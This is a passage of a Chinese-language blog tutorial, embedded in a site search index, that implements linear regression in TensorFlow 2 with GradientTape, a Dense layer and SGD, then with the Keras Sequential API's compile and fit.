-<p>这是一个标准的梯度下降过程,可以看到，损失函数的值随着迭代过程不断减小，意味着我们离最优化参数不断接近。</p>
-<p> 最终，我们绘制参数学习完成之后，模型的拟合结果。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>​                                                              <strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/5.png" class></strong></p>
-<p>由于是随机初始化参数，如果迭代后拟合效果仍然不好，一般是迭代次数太少的原因。可以重复执行上面的迭代单元格多次，增加参数更新迭代次数，即可改善拟合效果。</p>
-<h2 id="高阶-API-实现"><a href="#高阶-API-实现" class="headerlink" title="高阶 API 实现"></a>高阶 API 实现</h2><p>TensorFlow 2 中提供了大量的高阶 API 帮助我们快速构建所需模型，接下来，我们使用一些新的 API 来完成线性回归模型的构建。这里还是沿用上面提供的示例数据。</p>
-<p><code>tf.keras</code> 模块下提供的 <code>tf.keras.layers.Dense</code> 全连接层（线性层）实际上就是一个线性计算过程。所以，模型的定义部分就可以直接实例化一个全连接层即可。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.layers.Dense(units=<span class="number">1</span>)  <span class="comment"># 实例化线性层</span></span><br><span class="line">model</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>units</code> 为输出空间维度。此时，参数已经被初始化了，所以我们可以绘制出拟合直线。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>你可以使用 <code>model.variables</code> 打印出模型初始化的随机参数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.variables</span><br></pre></td></tr></table></figure>
-
-<p>接下来就可以直接构建模型迭代过程了。</p>
-<p>这里同样使用 <code>tf.GradientTape()</code> 来追踪梯度，我们简化损失计算和更新的过程。首先，损失函数无需再自行构造，我们可以直接使用 TensorFlow 提供的平方损失函数 <code>tf.keras.losses.mean_squared_error</code> 计算，然后使用 <code>tf.reduce_sum</code> 求得全部样本的平均损失。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">EPOCHS = <span class="number">10</span></span><br><span class="line">LEARNING_RATE = <span class="number">0.002</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCHS):  <span class="comment"># 迭代次数</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">        y_ = model(X)</span><br><span class="line">        loss = tf.reduce_sum(tf.keras.losses.mean_squared_error(y, y_))  <span class="comment"># 计算损失</span></span><br><span class="line"></span><br><span class="line">    grads = tape.gradient(loss, model.variables)  <span class="comment"># 计算梯度</span></span><br><span class="line">    optimizer = tf.keras.optimizers.SGD(LEARNING_RATE)  <span class="comment"># 随机梯度下降</span></span><br><span class="line">    optimizer.apply_gradients(zip(grads, model.variables))  <span class="comment"># 更新梯度</span></span><br><span class="line">    print(<span class="string">f&#x27;Epoch [<span class="subst">&#123;epoch&#125;</span>/<span class="subst">&#123;EPOCHS&#125;</span>], loss [<span class="subst">&#123;loss&#125;</span>]&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>其次，使用 <code>model.variables</code> 即可读取可参数的列表，无需像上面那样手动传入参数。这里不再按公式手动更新梯度，而是使用现有的随机梯度下降函数 <code>tf.keras.optimizers.SGD</code>，然后使用 <code>apply_gradients</code> 即可更新梯度。</p>
-<p>TensorFlow 中没有提供上方手动实现的梯度下降算法，只提供了<a href="https://zhuanlan.zhihu.com/p/25765735">随机梯度下降算法</a>。</p>
-<p>最终，同样将迭代完成的参数绘制拟合直线到原图中。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/6.png" class></strong></p>
-<p>一般情况下，应该能看到一个更好的拟合结果。当然，如果拟合效果不好，可能是迭代批次太少，可以重复执行优化过程。</p>
-<h2 id="Keras-方式实现"><a href="#Keras-方式实现" class="headerlink" title="Keras 方式实现"></a>Keras 方式实现</h2><p>配合 TensorFlow 提供的高阶 API，我们省去了定义线性函数，定义损失函数，以及定义优化算法等 3 个步骤。至此，你应该可以初步感受到 TensorFlow 的易用性和存在的必要性了。不过，上面的高阶 API 实现过程实际上还不够精简，我们可以完全使用 TensorFlow Keras API 来实现线性回归。</p>
-<p>Keras 本来是一个用 Python 编写的独立高阶神经网络 API，它能够以 TensorFlow, CNTK，或者 Theano 作为后端运行。目前，TensorFlow 已经吸纳 Keras，并组成了 <code>tf.keras</code> 模块。官方介绍，<code>tf.keras</code> 和单独安装的 Keras 略有不同，但考虑到未来的发展趋势，实验以学习 <code>tf.keras</code> 为主。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/7.png" class></strong></p>
-<p>我们这里使用 Keras 提供的 Sequential 顺序模型结构。和上面的例子相似，向其中添加一个线性层。不同的地方在于，Keras 顺序模型第一层为线性层时，规定需指定输入维度，这里为 <code>input_dim=1</code>。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.Sequential()  <span class="comment"># 新建顺序模型</span></span><br><span class="line">model.add(tf.keras.layers.Dense(units=<span class="number">1</span>, input_dim=<span class="number">1</span>))  <span class="comment"># 添加线性层</span></span><br><span class="line">model.summary()  <span class="comment"># 查看模型结构</span></span><br></pre></td></tr></table></figure>
-
-<p>接下来，直接使用 <code>.compile</code> 编译模型，指定损失函数为 MSE 平方损失函数，优化器选择 SGD 随机梯度下降。然后，就可以使用 <code>.fit</code> 传入数据开始迭代了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.compile(optimizer=<span class="string">&#x27;sgd&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)  <span class="comment"># 定义损失函数和优化方法</span></span><br><span class="line">model.fit(X, y, epochs=<span class="number">10</span>, batch_size=<span class="number">32</span>)  <span class="comment"># 训练模型</span></span><br></pre></td></tr></table></figure>
-
-<p><code>batch_size</code> 是采用小批次训练的参数，主要用于解决一次性传入数据过多无法训练的问题。当然，由于示例数据本身较少，这里意义不大，但还是按照常规使用方法进行设置。</p>
-<p>同样，绘制最终的结果：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>会发现，完全使用 Keras 高阶 API 实际上只需要 4 行核心代码即可完成，相比于最开始的低阶 API 简化了很多。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.Sequential()  <span class="comment"># 新建顺序模型</span></span><br><span class="line">model.add(tf.keras.layers.Dense(units=<span class="number">1</span>, input_dim=<span class="number">1</span>))  <span class="comment"># 添加线性层</span></span><br><span class="line">model.compile(optimizer=<span class="string">&#x27;sgd&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)  <span class="comment"># 定义损失函数和优化方法</span></span><br><span class="line">model.fit(X, y, epochs=<span class="number">10</span>, batch_size=<span class="number">32</span>)  <span class="comment"># 训练模型</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Machine Learning</category>
-        <category>TensorFlow</category>
-      </categories>
-      <tags>
-        <tag>TensorFlow2.0</tag>
       </tags>
   </entry>
 </search>
